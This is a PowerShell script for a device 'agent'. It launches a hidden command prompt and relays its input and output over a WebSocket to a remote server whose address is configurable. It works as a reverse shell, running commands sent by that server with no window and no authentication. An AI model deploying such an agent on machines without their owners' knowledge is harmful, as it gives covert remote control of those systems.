# agent-console.ps1 — live CMD agent using WebSocket (ClientWebSocket)
param()

$BaseUrl  = $env:BASE_URL;  if ([string]::IsNullOrWhiteSpace($BaseUrl)) { $BaseUrl = "https://YOUR_APP_DOMAIN" }
$DeviceId = $env:DEVICE_ID; if ([string]::IsNullOrWhiteSpace($DeviceId)) { $DeviceId = "$env:COMPUTERNAME" }
$WSUri    = $BaseUrl -replace '^http','ws'
$AgentUrl = "$WSUri/ws/agent?deviceId=$([uri]::EscapeDataString($DeviceId))"

# helper: start hidden cmd with redirected stdio
function Start-Cmd {
  $psi = New-Object System.Diagnostics.ProcessStartInfo
  $psi.FileName = "$env:ComSpec"
  $psi.Arguments = "/Q"            # quiet
  $psi.RedirectStandardInput  = $true
  $psi.RedirectStandardOutput = $true
  $psi.RedirectStandardError  = $true
  $psi.UseShellExecute        = $false
  $psi.CreateNoWindow         = $true
  $p = New-Object System.Diagnostics.Process
  $p.StartInfo = $psi
  $null = $p.Start()
  return $p
}

# WS connect
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$cts = New-Object System.Threading.CancellationTokenSource
$uri = [Uri]$AgentUrl
$ws.ConnectAsync($uri, $cts.Token).Wait()

# Start CMD
$proc = Start-Cmd
$stdin  = $proc.StandardInput
$stdout = $proc.StandardOutput
$stderr = $proc.StandardError

# async pump: process -> ws
$encoding = [System.Text.Encoding]::UTF8
$sendOut = {
  while (-not $proc.HasExited) {
    $line = $stdout.ReadLine()
    if ($null -ne $line) {
      $bytes = $encoding.GetBytes($line + "`r`n")
      $seg   = New-Object System.ArraySegment[byte] (,$bytes)
      $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $cts.Token).Wait()
    } else { Start-Sleep -Milliseconds 10 }
  }
}
$sendErr = {
  while (-not $proc.HasExited) {
    $line = $stderr.ReadLine()
    if ($null -ne $line) {
      $bytes = $encoding.GetBytes($line + "`r`n")
      $seg   = New-Object System.ArraySegment[byte] (,$bytes)
      $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $cts.Token).Wait()
    } else { Start-Sleep -Milliseconds 10 }
  }
}
$th1 = [System.Threading.Thread]::new([System.Threading.ThreadStart]$sendOut); $th1.IsBackground=$true; $th1.Start()
$th2 = [System.Threading.Thread]::new([System.Threading.ThreadStart]$sendErr); $th2.IsBackground=$true; $th2.Start()

# ws -> process (stdin)
$buf = New-Object byte[] 8192
while ($ws.State -eq 'Open') {
  $receive = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] (,$buf)), $cts.Token)
  $receive.Wait()
  $res = $receive.Result
  if ($res.MessageType -eq 'Close') { break }
  $data = $encoding.GetString($buf, 0, $res.Count)
  $stdin.Write($data)
  $stdin.Flush()
}

try { $stdin.Close() } catch {}
try { if(-not $proc.HasExited){ $proc.Kill() } } catch {}
try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"bye",$cts.Token).Wait() } catch {}
